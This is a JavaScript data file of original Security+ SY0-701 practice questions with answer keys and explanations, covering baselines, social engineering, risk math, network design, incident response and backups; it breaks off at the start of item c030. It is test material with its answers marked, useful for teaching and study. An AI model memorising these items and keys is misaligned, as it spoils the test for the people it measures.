/* Exam C — Sec+ SY0-701 — 85 original questions */
export const EXAM_BANK_C = [
{id:"c001",obj:"4.1",d:4,cat:"harden",t:"mc",
 q:"An MSP builds every client server from a hardened image based on a published benchmark. Six months later a scan shows that half of the servers have services re-enabled and weaker cipher settings than the image. Which of the following secure-baseline activities is the MSP failing to perform?",
 o:[
  {t:"Maintaining the baseline by continuously checking hosts for drift and re-applying settings",ok:true,x:"The image was established and deployed correctly; the failure is the maintain phase. Without periodic compliance checks and enforcement, configurations drift away from the baseline over time."},
  {t:"Establishing the baseline from an industry benchmark",ok:false,x:"The baseline was already established from a published benchmark; the problem appeared after deployment, not in how the standard was chosen."},
  {t:"Deploying the baseline using a golden image",ok:false,x:"Deployment worked, since every server started from the hardened image. The drift happened afterward, which is a maintenance gap."},
  {t:"Performing a site survey before installing the servers",ok:false,x:"A site survey measures wireless coverage and interference; it has nothing to do with server configuration drift."}
 ],
 w:"Secure baselines have three phases: establish, deploy, maintain. Drift means the maintain phase (monitoring and re-enforcement) is missing."},

{id:"c002",obj:"2.4",d:2,cat:"attacks",t:"mc",
 q:"An MSP technician reviews the remote-management console log below for a colleague who is known to be working from the office in Portland today. Which of the following indicators is present?",
 ex:"10:41  console login OK   user=d.reyes  src=198.51.100.23  geo=Portland, US\n10:52  console login OK   user=d.reyes  src=203.0.113.9    geo=Bucharest, RO\n10:53  script pushed to 14 client endpoints by d.reyes",
 o:[
  {t:"Impossible travel, suggesting the technician's credentials are being used by someone else",ok:true,x:"Two successful logins 11 minutes apart from opposite sides of the world cannot be the same person. Combined with a mass script push, this points to a stolen credential in an MSP tool with high blast radius."},
  {t:"Out-of-cycle logging, because the console wrote events outside the normal schedule",ok:false,x:"Out-of-cycle logging refers to log entries appearing at times a system normally would not write them. These entries are during the workday and the timing itself is not unusual."},
  {t:"Resource consumption, because 14 endpoints were touched at once",ok:false,x:"Resource consumption indicators are about CPU, memory, disk, or bandwidth spikes. Pushing a script to 14 endpoints is a normal MSP action; the concern is who did it."},
  {t:"Account lockout caused by repeated failed attempts",ok:false,x:"Both logins succeeded and no failures or lockouts appear in the log."}
 ],
 w:"Impossible travel = successful authentications from locations that cannot be reached in the elapsed time. In an MSP tool, treat it as an emergency and contain immediately."},

{id:"c003",obj:"5.5",d:5,cat:"third",t:"mc",
 q:"A remote-first consultancy hires a firm to test its cloud environment. Before the test starts, the consultancy provides the testers with a network diagram, a list of IP ranges, and one standard user account, but withholds source code and administrator credentials. Which of the following BEST describes this engagement?",
 o:[
  {t:"Partially known environment test",ok:true,x:"The testers received some insider information (diagram, ranges, a user account) but not everything, which is the definition of a partially known environment, sometimes called gray box."},
  {t:"Unknown environment test",ok:false,x:"An unknown environment test gives testers nothing beyond what an outsider could learn. Handing over a diagram and an account rules this out."},
  {t:"Known environment test",ok:false,x:"A known environment test provides full disclosure, including source code and privileged access. Source code and admin credentials were deliberately withheld."},
  {t:"Defensive penetration test",ok:false,x:"Defensive testing focuses on evaluating detection and response, which is not what the amount of information shared describes. The question is about the environment knowledge level."}
 ],
 w:"Known = full information, unknown = none, partially known = some. Match the label to how much the testers were told."},

{id:"c004",obj:"1.1",d:1,cat:"controls",t:"ms",pick:2,dg:"controls",
 q:"A city government installs a new records archive. It posts signs stating that all access is recorded, hires a guard for the lobby, and adds a card reader that will not unlock the archive door for anyone outside the records department. Which TWO of the following correctly classify these controls?",
 o:[
  {t:"The warning signs are a deterrent control",ok:true,x:"Signs that announce monitoring discourage an attempt without physically stopping it, which is the definition of a deterrent control."},
  {t:"The card reader is a technical preventive control",ok:true,x:"The reader is technology that stops unauthorized people from entering; that is technical (category) and preventive (type)."},
  {t:"The guard is a technical control",ok:false,x:"A guard is a person providing physical security; that is a physical (or operational) control, not a technical one, which is implemented in hardware or software."},
  {t:"The card reader is a corrective control",ok:false,x:"Corrective controls restore a system after an incident, such as restoring from backup. A door reader prevents entry rather than fixing damage."},
  {t:"The warning signs are a compensating control",ok:false,x:"Compensating controls substitute for a required control that cannot be implemented. Nothing in the scenario says the signs replace an unavailable control."}
 ],
 w:"Classify each control twice: category (technical, managerial, operational, physical) and type (preventive, deterrent, detective, corrective, compensating, directive)."},

{id:"c005",obj:"3.2",d:3,cat:"netsec",t:"mc",dg:"dmz",
 q:"A city is deploying a public permit-lookup web server and its back-end database. The security architect wants internet users to reach the web server while ensuring that a compromise of that server does not give direct access to the internal network. Which of the following device placements BEST meets the requirement?",
 o:[
  {t:"Place the web server in a screened subnet and the database on the internal network with a firewall between them",ok:true,x:"A screened subnet isolates internet-facing hosts between two firewall interfaces. The database stays inside, and only the specific web-to-database port is allowed through, limiting the blast radius."},
  {t:"Place both the web server and the database in the screened subnet",ok:false,x:"Putting the database next to the exposed web server means an attacker who compromises the web server has the data on the same segment. The database has no need to be internet-adjacent."},
  {t:"Place the web server on the internal LAN behind a single firewall with port 443 forwarded",ok:false,x:"Port forwarding a public service into the internal LAN means a compromised web server is already inside the network, which is exactly what the architect wants to avoid."},
  {t:"Place the web server outside the firewall with a host-based firewall only",ok:false,x:"An unprotected host on the internet edge relies entirely on its own configuration and has no network-layer control on what it can reach if compromised."}
 ],
 w:"Internet-facing services belong in a screened subnet; data stores stay internal, reachable only through a narrowly permitted firewall path."},

{id:"c006",obj:"4.2",d:4,cat:"ops",t:"mc",
 q:"A city government is retiring 300 desktop computers that processed resident records. Policy says no readable drive may leave city control, and auditors must be able to verify compliance a year from now. Which of the following is the BEST approach?",
 o:[
  {t:"Sanitize or destroy each drive by an approved method, record method and serial in the asset system, keep the certificates",ok:true,x:"Sanitization plus documentation plus certification satisfies both requirements: the data is unrecoverable and the evidence survives for the audit."},
  {t:"Reformat each drive and donate the computers to a local charity",ok:false,x:"A quick format rewrites the file system table only; resident records remain recoverable."},
  {t:"Remove the drives and keep them in an unlocked storeroom until space is needed",ok:false,x:"Indefinite storage of readable drives in an unsecured room is a retention and physical-security failure, not disposal."},
  {t:"Have the recycler sign an NDA and ship the computers intact",ok:false,x:"An NDA does not sanitize anything; readable drives would leave city control."}
 ],
 w:"Disposal: sanitize (overwrite, cryptographic erase, degauss) or destroy, then document and certify. Formatting and paperwork do not remove data."},
{id:"c007",obj:"2.2",d:2,cat:"social",t:"mc",
 q:"The accounts payable clerk at a consultancy receives an email from the managing partner's actual mailbox, with a correct signature block and a reply to an existing thread, asking that a long-standing supplier's bank details be changed before the next payment run. The partner is traveling and unreachable. Which of the following BEST describes this attack?",
 o:[
  {t:"Business email compromise",ok:true,x:"The message comes from the executive's real, compromised mailbox and requests a payment redirection. That is BEC, which is why it lacks the lookalike-domain clues of ordinary phishing."},
  {t:"Brand impersonation",ok:false,x:"Brand impersonation mimics a well-known company's look and feel to trick the public. This email is from a real internal account, not a copied brand."},
  {t:"Smishing",ok:false,x:"Smishing uses SMS text messages as the channel. This attack arrived by email within an existing thread."},
  {t:"Typosquatting",ok:false,x:"Typosquatting relies on a misspelled domain. The email came from the genuine mailbox, so no lookalike domain is involved."}
 ],
 w:"BEC uses a real or convincingly spoofed executive account to authorize fraudulent payments. Verify bank-detail changes out-of-band using a known phone number, never via the email thread."},

{id:"c008",obj:"5.2",d:5,cat:"gov",t:"ms",pick:2,dg:"risk",
 q:"A city's risk register contains the row below for its permit database server. A proposed backup appliance costing $9,000 per year would reduce the exposure factor to 10%. Which TWO of the following statements are correct?",
 ex:"Risk: hardware failure of permit DB server\nAsset value (AV): $120,000\nExposure factor (EF): 50%\nARO: 0.5 (once every 2 years)\nOwner: IT Director",
 o:[
  {t:"The current ALE is $30,000",ok:true,x:"SLE = AV x EF = 120,000 x 0.5 = $60,000. ALE = SLE x ARO = 60,000 x 0.5 = $30,000."},
  {t:"The appliance is cost-justified because it saves more per year than it costs",ok:true,x:"With EF at 10%, SLE becomes $12,000 and ALE becomes 12,000 x 0.5 = $6,000. The saving is 30,000 - 6,000 = $24,000 per year, which exceeds the $9,000 cost."},
  {t:"The current SLE is $30,000",ok:false,x:"$30,000 is the annualized figure. The single loss expectancy is AV x EF = $60,000."},
  {t:"The ARO of 0.5 means the event happens twice per year",ok:false,x:"ARO is occurrences per year; 0.5 means once every two years, not twice a year."},
  {t:"The ALE after the appliance is $12,000",ok:false,x:"$12,000 is the new SLE. Multiplying by the ARO of 0.5 gives a post-control ALE of $6,000."}
 ],
 w:"SLE = AV x EF; ALE = SLE x ARO. A control pays for itself when the reduction in ALE exceeds its annual cost."},

{id:"c009",obj:"4.4",d:4,cat:"ops",t:"mc",
 q:"A city network team notices that its internet link is saturated every evening. Full packet capture is not available on the core router, but the team has the summary records below. Which of the following data sources produced this output?",
 ex:"SrcAddr        DstAddr         Proto  DstPort  Packets   Bytes\n10.20.4.17     203.0.113.77    TCP    443      918,204   1.2 GB\n10.20.4.17     203.0.113.77    TCP    443      877,110   1.1 GB\n10.20.9.3      198.51.100.5    UDP    53       1,208     96 KB",
 o:[
  {t:"NetFlow",ok:true,x:"NetFlow exports flow metadata such as source, destination, protocol, port, packet and byte counts without capturing payload. It is exactly what is needed to find who is consuming the bandwidth."},
  {t:"A packet capture",ok:false,x:"The scenario states full capture is unavailable, and the output shows per-flow totals, not individual packets with payload."},
  {t:"SNMP traps",ok:false,x:"SNMP traps are event notifications sent by devices when a threshold or state change occurs; they do not list per-conversation traffic volumes."},
  {t:"A vulnerability scan report",ok:false,x:"A vulnerability scanner reports weaknesses on hosts, not traffic flows between addresses."}
 ],
 w:"NetFlow gives conversation-level metadata (who talked to whom, how much) with far less storage than packet capture."},

{id:"c010",obj:"3.2",d:3,cat:"netsec",t:"mc",
 q:"A city court stores sealed juvenile records behind an inline appliance that inspects every request. Legal counsel states that an unauthorized disclosure is far worse than the records being temporarily unavailable. Which of the following failure modes should be configured on the appliance?",
 o:[
  {t:"Fail-closed, so that traffic is blocked if the appliance stops functioning",ok:true,x:"When confidentiality outweighs availability, the device should block all traffic on failure so no request bypasses inspection."},
  {t:"Fail-open, so that traffic continues if the appliance stops functioning",ok:false,x:"Fail-open keeps the service available but lets uninspected requests through, which is the outcome counsel said is unacceptable."},
  {t:"Passive monitoring through a network tap",ok:false,x:"A tap only observes and cannot block anything, so it cannot enforce access to the records at all."},
  {t:"Active-active clustering of the appliance",ok:false,x:"Clustering improves availability but does not define what happens when the whole inspection function fails; the question asks for the failure mode."}
 ],
 w:"Fail-closed protects confidentiality and integrity at the expense of availability; fail-open does the reverse. Choose based on which matters more."},

{id:"c011",obj:"2.4",d:2,cat:"attacks",t:"mc",
 q:"A consultancy's client portal shows the login pattern below over ten minutes. Each attempt uses a different username and a different password, and about 4% of attempts succeed on the first try. Which of the following attacks is MOST likely occurring?",
 ex:"12:00:01 login FAIL  user=amber.k@example.net   src=203.0.113.50\n12:00:01 login OK    user=t.moore@example.org    src=203.0.113.50\n12:00:02 login FAIL  user=jp.rivera@example.com  src=203.0.113.50\n12:00:02 login OK    user=lena.w@example.net     src=203.0.113.50\n(... 6,000 more unique username/password pairs ...)",
 o:[
  {t:"Credential stuffing using username and password pairs leaked from another site",ok:true,x:"Unique pairs tried once each with a meaningful first-try success rate is the signature of replaying leaked credentials. Users who reuse passwords across sites are the ones being logged into."},
  {t:"Password spraying",ok:false,x:"Spraying uses one or a few common passwords against many accounts. Here every attempt has a different password, and the first-try success rate is far too high for guessing."},
  {t:"Brute force against a single account",ok:false,x:"Brute force hammers one account with many passwords. This log shows one attempt per account across thousands of accounts."},
  {t:"A birthday attack against the password hashes",ok:false,x:"A birthday attack targets hash collisions offline; it does not appear as online login attempts against a portal."}
 ],
 w:"Credential stuffing = many unique leaked pairs, one try each, notable success. Spraying = one password, many users. Brute force = one user, many passwords."},

{id:"c012",obj:"4.8",d:4,cat:"ir",t:"mc",
 q:"During a theft investigation at city hall, an investigator reviews the evidence log below for a seized laptop. Which of the following problems will MOST likely be raised if the case goes to court?",
 ex:"Item: Laptop SN 7Q3-2291\n03/04 09:10  Seized from office 214       by R. Ortiz     sig: RO\n03/04 09:30  Sealed in bag #118          by R. Ortiz     sig: RO\n03/04 14:05  Received at forensics lab   by K. Adebayo   sig: KA\n03/06 08:00  Imaging started              by K. Adebayo   sig: KA",
 o:[
  {t:"The two-day delay before imaging makes the disk evidence inadmissible",ok:false,x:"A delay by itself does not invalidate evidence as long as the device was sealed and every custodian is recorded. Courts care about unbroken, documented custody, not speed."},
  {t:"The chain of custody is broken because the transfer from the seizing officer to the lab is not documented",ok:true,x:"Between the seal at 09:30 and the lab receipt at 14:05 nobody signed for the laptop. An undocumented handoff lets the defense argue the evidence could have been altered."},
  {t:"Imaging should have occurred before the device was sealed",ok:false,x:"Sealing the device immediately after seizure is correct practice; imaging is done later in the lab under controlled conditions."},
  {t:"The laptop should not have been seized without a legal hold notice",ok:false,x:"Legal hold is an instruction to preserve data from routine deletion; it is not a prerequisite for physically seizing a device during an investigation."}
 ],
 w:"Every custody transfer must be logged with who, when, and signatures. Any unrecorded interval breaks the chain and threatens admissibility."},

{id:"c013",obj:"1.2",d:1,cat:"controls",t:"mc",dg:"zerotrust",
 q:"A remote-first consultancy is implementing zero trust. A consultant's laptop requests access to a client data repository. One component evaluates the device posture and identity and returns a verdict; a separate gateway in the traffic path then permits or drops the session. Which of the following is the gateway?",
 o:[
  {t:"The policy enforcement point, part of the data plane",ok:true,x:"The component that sits in the traffic path and applies the decision (allow or drop) is the policy enforcement point, which lives in the data plane."},
  {t:"The policy engine, part of the control plane",ok:false,x:"The policy engine makes the decision based on identity and posture; it is the component that returned the verdict, not the gateway that carries traffic."},
  {t:"The policy administrator, part of the data plane",ok:false,x:"The policy administrator is in the control plane and communicates decisions to the enforcement point. It is not the in-path gateway, and it is not in the data plane."},
  {t:"An implicit trust zone, part of the control plane",ok:false,x:"An implicit trust zone is the small area where traffic is allowed after a decision; it is a data-plane concept, not a decision-communicating component."}
 ],
 w:"Control plane decides (policy engine + policy administrator); data plane enforces (policy enforcement point). Gateways in the traffic path are PEPs."},

{id:"c014",obj:"5.1",d:5,cat:"gov",t:"ms",pick:2,
 q:"An MSP is organizing its client-facing security documents. One document lists the required 14-character password minimum and mandatory MFA; a second gives step-by-step instructions for disabling a departing employee's accounts; a third suggests, but does not require, locking screens after five minutes. Which TWO of the following are correct?",
 o:[
  {t:"The password minimum document is a standard",ok:true,x:"Standards define specific, mandatory configuration values that support a policy, such as minimum length and MFA requirements."},
  {t:"The account-disabling instructions are a procedure",ok:true,x:"Procedures are step-by-step instructions for performing a task, in this case offboarding."},
  {t:"The screen-lock suggestion is a standard",ok:false,x:"A standard is mandatory. A recommendation that is optional is a guideline."},
  {t:"The password minimum document is a guideline",ok:false,x:"The 14-character minimum and MFA are required, not suggested, so it is not a guideline."},
  {t:"The account-disabling instructions are a policy",ok:false,x:"A policy states high-level intent and rules; a numbered checklist for a task is a procedure."}
 ],
 w:"Policy = what and why (mandatory, high level). Standard = mandatory specifics. Procedure = how, step by step. Guideline = recommended but optional."},

{id:"c015",obj:"2.2",d:2,cat:"social",t:"mc",
 q:"An MSP help-desk technician receives a call from someone who says they are from the firewall vendor's support team, quotes a plausible case number, references a recent firmware advisory, and asks the technician to start a remote session so they can apply the fix. No case was ever opened. Which of the following BEST describes the technique?",
 o:[
  {t:"Pretexting",ok:true,x:"The caller built a detailed fabricated scenario (case number, advisory, urgency) to make the request seem legitimate. That invented backstory is the defining feature of pretexting."},
  {t:"Watering hole attack",ok:false,x:"A watering hole compromises a website the targets trust. This attack is a live phone call with a fabricated story."},
  {t:"Smishing",ok:false,x:"Smishing uses text messages. This request arrived by voice call."},
  {t:"Typosquatting",ok:false,x:"Typosquatting relies on misspelled domains to catch mistyped URLs. No domain or link is involved in this phone call."}
 ],
 w:"Pretexting = a fabricated, detail-rich scenario used to justify a request. Verify by calling the vendor back on a known number and checking for a real case."},

{id:"c016",obj:"4.1",d:4,cat:"harden",t:"mc",
 q:"A small dental office managed by an MSP uses WPA2 with a pre-shared key. The MSP is concerned that an attacker who captures the handshake from the parking lot can crack the passphrase offline. Which of the following upgrades BEST addresses this concern while keeping a simple shared passphrase?",
 o:[
  {t:"Move to WPA3-Personal, which uses SAE for authentication",ok:true,x:"WPA3-Personal replaces the WPA2 four-way handshake with Simultaneous Authentication of Equals, which resists offline dictionary attacks even if traffic is captured, and keeps a passphrase model."},
  {t:"Hide the SSID and enable MAC address filtering",ok:false,x:"Both are trivially bypassed by sniffing and spoofing, and neither changes the crackable WPA2 handshake."},
  {t:"Deploy WPA3-Enterprise with certificates on every device",ok:false,x:"This would be secure but requires a RADIUS server and certificate enrollment, contradicting the requirement to keep a simple shared passphrase for a small office."},
  {t:"Switch to WEP with a longer key",ok:false,x:"WEP is broken regardless of key length and is far weaker than WPA2."}
 ],
 w:"WPA3-Personal (SAE) defends the passphrase against offline cracking; WPA3-Enterprise adds 802.1X/RADIUS for per-user authentication."},

{id:"c017",obj:"3.4",d:3,cat:"data",t:"mc",
 q:"A city runs its primary data center in a basement and a fully equipped hot site in a building three blocks away. Both sit in the same river floodplain. An auditor says the recovery design has a weakness. Which of the following BEST addresses it?",
 o:[
  {t:"Relocate the hot site to a region that would not be affected by the same regional disaster",ok:true,x:"Two sites in the same floodplain share the same risk. Geographic dispersion ensures a single regional event cannot take out both."},
  {t:"Downgrade the hot site to a warm site to reduce cost",ok:false,x:"The weakness is shared location risk, not cost; a warm site in the same floodplain would still flood."},
  {t:"Add a second generator to the hot site",ok:false,x:"Extra power does not help if the building itself is under water."},
  {t:"Increase backup frequency to hourly",ok:false,x:"More frequent backups reduce data loss but do not provide a place to run if both facilities are lost together."}
 ],
 w:"Recovery sites must be far enough apart that one regional event (flood, earthquake, grid failure) cannot affect both."},

{id:"c018",obj:"2.4",d:2,cat:"attacks",t:"mc",
 q:"A city's document server writes its access log only during business hours because the building's network is shut down nightly. An analyst finds the entries below. Which of the following indicators does this represent?",
 ex:"Sun 02:14:07  read   /archive/hr/personnel_2019.zip     user=svc_backup\nSun 02:14:09  read   /archive/hr/personnel_2020.zip     user=svc_backup\nSun 02:14:12  read   /archive/hr/personnel_2021.zip     user=svc_backup\nSun 02:16:30  read   /archive/legal/settlements.zip      user=svc_backup",
 o:[
  {t:"Out-of-cycle logging, since activity is recorded at a time the system should be idle",ok:true,x:"Log entries appearing outside the expected schedule, especially bulk reads of sensitive archives by a service account at 2 a.m. on a Sunday, are the out-of-cycle indicator and suggest misuse of that account."},
  {t:"Missing logs, since the weekday entries are absent",ok:false,x:"The scenario explains weekday coverage as normal business-hours logging. Nothing has been deleted; instead there are unexpected extra entries."},
  {t:"Resource inaccessibility, since files were opened by the wrong account",ok:false,x:"Resource inaccessibility means users cannot reach a system or file. Here files were accessed successfully, just at an abnormal time."},
  {t:"Blocked content, since the archive reads should have been denied",ok:false,x:"The reads were permitted, not blocked, so no blocked-content event was generated."}
 ],
 w:"Out-of-cycle logging = events at times when there should be none. Investigate what the account did and whether the nightly network shutdown was bypassed."},

{id:"c019",obj:"5.5",d:5,cat:"third",t:"mc",
 q:"A penetration tester begins an engagement for a consultancy. The tester's activity for the first day is shown below. Which of the following BEST describes this phase of the test?",
 ex:"$ whois consultancy-example.com\n$ dig consultancy-example.com ANY\n$ curl -s https://www.consultancy-example.com/team | grep -i 'engineer'\n$ (searches public job postings for 'VPN appliance' and 'SIEM')\n$ (reviews certificate transparency logs for subdomains)",
 o:[
  {t:"Passive reconnaissance",ok:true,x:"Every action queries public sources (WHOIS, DNS, the public website, job posts, CT logs) without sending probes that would be logged as attacks. That is passive recon."},
  {t:"Active reconnaissance",ok:false,x:"Active recon interacts directly with target systems in a detectable way, such as port scanning or banner grabbing. Reading public records and a public page is not that."},
  {t:"Exploitation",ok:false,x:"No vulnerability is being leveraged; the tester is still gathering information."},
  {t:"A defensive penetration test",ok:false,x:"Defensive testing evaluates the target's detection and response capabilities. The exhibit shows offensive information gathering, not a defensive exercise."}
 ],
 w:"Passive recon uses public sources and does not touch the target directly; active recon (scanning, probing) generates traffic the target can detect."},

{id:"c020",obj:"4.1",d:4,cat:"harden",t:"mc",
 q:"Consultants at a remote-first firm refuse to enroll personal phones in MDM because they fear the company can read their photos and wipe the whole device. The firm still needs to protect client email and files on those phones. Which of the following MDM approaches BEST resolves the concern?",
 o:[
  {t:"Deploy a managed work container with selective wipe of corporate data only",ok:true,x:"Containerization separates company apps and data into an encrypted managed area. The firm can enforce policy and wipe that container without touching personal photos or performing a full device reset."},
  {t:"Require full-device encryption and remote wipe of the entire phone",ok:false,x:"This is exactly the capability the consultants object to and applies device-wide control to personal data."},
  {t:"Disable MDM and rely on strong email passwords",ok:false,x:"Without any management the firm cannot enforce encryption, screen lock, or removal of client data when a phone is lost or the consultant leaves."},
  {t:"Issue COPE devices to every consultant",ok:false,x:"Corporate-owned devices would work but do not solve the stated problem of protecting data on the personal phones the firm has decided to allow."}
 ],
 w:"For BYOD, use containerization (storage segmentation) and selective wipe so corporate data is controlled while personal data stays private."},

{id:"c021",obj:"1.2",d:1,cat:"controls",t:"mc",
 q:"An MSP places an AWS-style access key with no real permissions inside a script in a client's code repository. The key is never used legitimately, and any attempt to use it against the cloud API triggers an alert to the SOC. Which of the following deception techniques is this?",
 o:[
  {t:"Honeytoken",ok:true,x:"A honeytoken is a piece of fake data (credential, record, key) whose only purpose is to be stolen and reveal the thief when it is used."},
  {t:"Honeypot",ok:false,x:"A honeypot is a decoy system or service that attackers interact with. A single planted credential is data, not a system."},
  {t:"Honeynet",ok:false,x:"A honeynet is an entire decoy network of multiple honeypots, far larger than one fake key."},
  {t:"Honeyfile",ok:false,x:"A honeyfile is a decoy document that alerts when opened. The trigger here is use of the key against an API, not opening a file, so honeytoken is the more precise term."}
 ],
 w:"Honeypot = decoy system; honeynet = decoy network; honeyfile = decoy document; honeytoken = decoy data such as a fake credential."},

{id:"c022",obj:"2.4",d:2,cat:"attacks",t:"ms",pick:2,
 q:"A consultancy confirms that attackers are logging into its client portal using username and password pairs leaked from unrelated breaches. Which TWO of the following controls would MOST directly reduce the success of this specific attack?",
 o:[
  {t:"Require MFA for every portal login",ok:true,x:"Even a correct leaked password fails without the second factor, which stops credential stuffing regardless of password reuse."},
  {t:"Check new and existing passwords against known-breached password lists and force resets on matches",ok:true,x:"Credential stuffing works only when a user reuses a leaked password. Blocking known-breached passwords removes the exact condition the attack depends on."},
  {t:"Lock accounts after five failed attempts",ok:false,x:"Stuffing tries each account once with the correct leaked password; there are no repeated failures on one account to trigger a lockout."},
  {t:"Increase the required password complexity to include symbols",ok:false,x:"A complex password that was leaked elsewhere is still a valid leaked password. Complexity does not prevent reuse."},
  {t:"Force password changes every 30 days",ok:false,x:"Frequent expiration encourages predictable variants and does not stop a user from reusing a breached password today."}
 ],
 w:"Credential stuffing depends on password reuse. MFA and breached-password screening attack that dependency; lockout and complexity rules do not."},

{id:"c023",obj:"3.2",d:3,cat:"netsec",t:"mc",
 q:"A city's online utility-billing application keeps getting requests containing SQL fragments and encoded script in form fields. The existing perimeter firewall permits port 443 and sees only encrypted TLS. Which of the following should be deployed to inspect and block these requests?",
 o:[
  {t:"A web application firewall in front of the application",ok:true,x:"A WAF terminates or inspects HTTPS at layer 7 and applies rules for injection, XSS, and other application-level attacks, which a port-based firewall cannot see."},
  {t:"A layer 4 firewall with stricter port rules",ok:false,x:"Port 443 must remain open for the application. A layer 4 device cannot examine the HTTP body where the injection payloads live."},
  {t:"A network tap feeding an IDS",ok:false,x:"A passive tap can alert but cannot block, and without TLS decryption the IDS would see only ciphertext."},
  {t:"A load balancer to spread the malicious requests",ok:false,x:"Distributing the requests across servers changes nothing about whether they are allowed to reach the application."}
 ],
 w:"Injection and XSS live in the HTTP payload; blocking them needs a layer 7 device (WAF), not a port-based firewall."},

{id:"c024",obj:"4.5",d:4,cat:"ops",t:"mc",
 q:"An MSP publishes the DNS record below for a client domain. The client then complains that invoices sent by their third-party billing service, which sends mail from its own servers, are being rejected by customers. Which of the following is the MOST likely cause?",
 ex:"client-example.com.  TXT  \"v=spf1 ip4:203.0.113.10 include:_spf.mailhost-example.net -all\"",
 o:[
  {t:"The billing service's sending servers are not listed in the SPF record, and -all instructs receivers to reject",ok:true,x:"SPF authorizes only 203.0.113.10 and the mailhost include. Mail from the billing provider fails the check, and the hard-fail qualifier tells recipients to reject it."},
  {t:"The record is missing a DKIM selector",ok:false,x:"DKIM is published in a separate selector record; its absence does not cause SPF rejection of the billing service's mail."},
  {t:"The record should use the mx mechanism instead of ip4",ok:false,x:"Using mx instead of ip4 would authorize the domain's inbound mail servers, which still would not include the billing service's outbound servers."},
  {t:"DMARC is configured with a quarantine policy",ok:false,x:"No DMARC record is shown, and the stated symptom is rejection driven by the SPF -all qualifier."}
 ],
 w:"SPF must list every legitimate sending source, including third-party services. -all = hard fail (reject); ~all = soft fail."},

{id:"c025",obj:"5.3",d:5,cat:"third",t:"mc",
 q:"An MSP signs a long-term agreement with a city that sets general terms, liability limits, and payment conditions for all future work. Each specific project, such as a firewall migration, is then documented separately with its own deliverables, timeline, and price. Which of the following BEST describes the two documents?",
 o:[
  {t:"A master service agreement with a statement of work for each project",ok:true,x:"The MSA covers the overarching relationship; each SOW (or work order) defines the scope, deliverables, and cost of a particular project under that umbrella."},
  {t:"A memorandum of understanding with a service-level agreement for each project",ok:false,x:"An MOU is a non-binding statement of intent, not a binding commercial contract with liability terms, and an SLA defines performance metrics rather than project scope."},
  {t:"A business partnership agreement with a non-disclosure agreement for each project",ok:false,x:"A BPA governs shared ownership and profit between partners, which does not describe a vendor-client relationship; NDAs cover confidentiality, not deliverables."},
  {t:"A service-level agreement with a memorandum of agreement for each project",ok:false,x:"An SLA sets measurable service targets such as uptime; it does not establish the general commercial terms of a multi-year relationship."}
 ],
 w:"MSA = umbrella terms; SOW/WO = per-project scope and price; SLA = measurable service targets; MOU/MOA = intent or cooperation; NDA = confidentiality."},

{id:"c026",obj:"2.2",d:2,cat:"social",t:"mc",
 q:"Several city procurement officers were infected with the same malware within one week. Analysis shows each visited a small state contracting-portal website that had been altered to serve an exploit kit. No phishing emails were received. Which of the following BEST describes this attack?",
 o:[
  {t:"Watering hole attack",ok:true,x:"The attacker compromised a legitimate site that this specific group is known to visit and waited for them, which is the defining pattern of a watering hole."},
  {t:"Business email compromise",ok:false,x:"BEC uses a compromised or spoofed executive mailbox to request payments; no email was involved here."},
  {t:"Typosquatting",ok:false,x:"Typosquatting depends on victims mistyping a URL. These users visited the genuine, correctly spelled site, which had itself been compromised."},
  {t:"Pretexting",ok:false,x:"Pretexting is a fabricated story used to manipulate a person. There was no human interaction, just a compromised website."}
 ],
 w:"Watering hole = compromise a trusted third-party site your targets frequent. Defenses include browser hardening, patching, and web filtering with reputation checks."},

{id:"c027",obj:"4.4",d:4,cat:"ops",t:"mc",
 q:"A consultancy's security team receives the alert below. The sender is a legitimate analyst, and the recipient is a client contact. Which of the following tools generated this alert?",
 ex:"ALERT  policy=PII-Outbound  action=BLOCK\nsender=m.chen@consult-example.com  recipient=j.park@client-example.org\nmatched: 42 patterns of type SSN (\\d{3}-\\d{2}-\\d{4}) in attachment survey_raw.xlsx\nchannel=email",
 o:[
  {t:"Data loss prevention",ok:true,x:"DLP inspects outbound content for defined sensitive-data patterns such as SSNs and blocks or quarantines the message. This alert shows a content-pattern policy match on an outbound email."},
  {t:"File integrity monitoring",ok:false,x:"FIM detects changes to protected files on a host; it does not scan email attachments for personal data patterns."},
  {t:"An email gateway performing SPF validation",ok:false,x:"SPF checks whether a sending server is authorized for a domain. It does not examine attachment contents for SSNs."},
  {t:"Endpoint detection and response",ok:false,x:"EDR monitors process behavior on endpoints for malicious activity; it does not enforce data-pattern policies on outgoing mail."}
 ],
 w:"DLP = content inspection for sensitive data leaving the organization (email, web, USB) with block or quarantine actions."},

{id:"c028",obj:"1.3",d:1,cat:"controls",t:"mc",
 q:"An MSP applied a routine operating system update to a client's file server during an approved window. The update silently upgraded a shared library, and the client's legacy accounting application stopped launching the next morning. Which of the following change management elements would MOST likely have caught this before deployment?",
 o:[
  {t:"Impact analysis that identifies application dependencies on the system being changed",ok:true,x:"Impact analysis asks what else relies on the component being changed. Discovering the legacy app's dependency on that library would have prompted testing or an exception."},
  {t:"A maintenance window",ok:false,x:"The change was already performed in an approved window. Scheduling controls when a change happens, not whether it will break something."},
  {t:"Version control of the change records",ok:false,x:"Version control tracks revisions of documents and configurations; it does not evaluate whether an update will break a dependent application."},
  {t:"A standard operating procedure for restarting services",ok:false,x:"Restart procedures help after a change; the application failed because of an incompatible library, not because a service was left stopped."}
 ],
 w:"Impact analysis (including dependencies and legacy applications) belongs before approval. A backout plan is the safety net if it is missed."},

{id:"c029",obj:"3.4",d:3,cat:"data",t:"ms",pick:2,dg:"backups",
 q:"A consultancy replicates its file server in real time to a second cloud region and calls this its backup strategy. After ransomware encrypted the primary server, the replica was encrypted within seconds. Which TWO of the following changes would have allowed recovery?",
 o:[
  {t:"Keep offline or immutable backup copies that cannot be modified once written",ok:true,x:"Ransomware cannot encrypt a copy it cannot write to. Offline or immutable storage preserves a clean version regardless of what happens to live systems."},
  {t:"Retain point-in-time snapshots or versioned backups going back several days",ok:true,x:"Snapshots and versioning allow rolling back to a state before the encryption started, something synchronous replication cannot provide because it mirrors the damage."},
  {t:"Replicate to a third cloud region as well",ok:false,x:"A third synchronous replica would have been encrypted just as quickly; more copies of the same live data do not add recoverability."},
  {t:"Increase the replication bandwidth so the copy is more current",ok:false,x:"Being more current is the problem, not the solution; the replica faithfully copied the encrypted files."},
  {t:"Enable journaling on the primary file system",ok:false,x:"File-system journaling protects against crashes and inconsistency, not against an attacker deliberately overwriting file contents."}
 ],
 w:"Replication provides availability, not recovery. Backups need retention, versions or snapshots, and an offline or immutable copy."},

{id:"c030",obj:"4.5",d:4,cat:"ops",t:"mc",
